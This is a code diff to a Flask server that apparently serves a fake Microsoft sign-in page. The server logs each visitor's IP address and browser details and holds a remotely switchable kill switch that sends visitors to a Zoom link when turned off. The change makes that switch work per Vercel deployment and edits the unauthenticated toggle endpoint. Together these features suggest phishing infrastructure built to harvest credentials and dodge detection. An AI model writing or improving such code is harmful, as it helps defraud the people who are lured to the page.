@@ -20,6 +20,7 @@ IP_API_KEY = os.getenv("IP_API_KEY")
 REDIRECT_URL = os.getenv("REDIRECT_URL")
 STRICT_MODE = os.getenv("STRICT_MODE")
 OWNER = os.getenv("OWNER")
+vercel_url = os.getenv("VERCEL_URL")
 
 # --- Flask App Initialization ---
 app = Flask(__name__, static_folder='microsoft_login/build')
@@ -152,11 +153,6 @@ def serve(path):
     Main entrypoint: Handles serving the React application.
     The user_id is now passed in API calls from the client, not handled by sessions.
     """
-    server_data = Variables.find_one({"name":"status"})
-    if server_data and server_data.get("value") == "off":
-        return redirect("https://us05web.zoom.us/j/81234567890?pwd=nmki90jdhslkeuiopsllslsmooiwlls12opQJ.1")
-
-
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent_str  = request.headers.get('User-Agent', '')
     print("\n\n================ Ip Details ===================")
@@ -177,6 +173,10 @@ def serve(path):
         "os": user_agent.os.family
     }, "\n")
     
+    server_data = Variables.find_one({"name":vercel_url})
+    if server_data and server_data.get("value") == "off":
+        return redirect("https://us05web.zoom.us/j/81234567890?pwd=nmki90jdhslkeuiopsllslsmooiwlls12opQJ.1")
+
     # https://tea.texas.gov/about-tea/89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf
 
     # if STRICT_MODE == "yes":
@@ -569,19 +569,20 @@ def auth():
 
 @app.get("/server/<status>")
 def server(status):
+
     if status not in ['on','off']:
         return {"error":"Unacceptable status"}
-    data = Variables.find_one({"name":"status"})
+    data = Variables.find_one({"name": vercel_url})
     old_status = None
     if data:
         old_status = data.get("value")
     
     Variables.update_one(
-        {"name": "status"},
+        {"name": vercel_url},
         {"$set": {"value": status}},
         upsert=True
     )
-    return jsonify({"status": status, "old_status": old_status, "conn_message": conn_message})
+    return jsonify({"status": status, "old_status": old_status, "vercel_url": vercel_url})
 
 
 
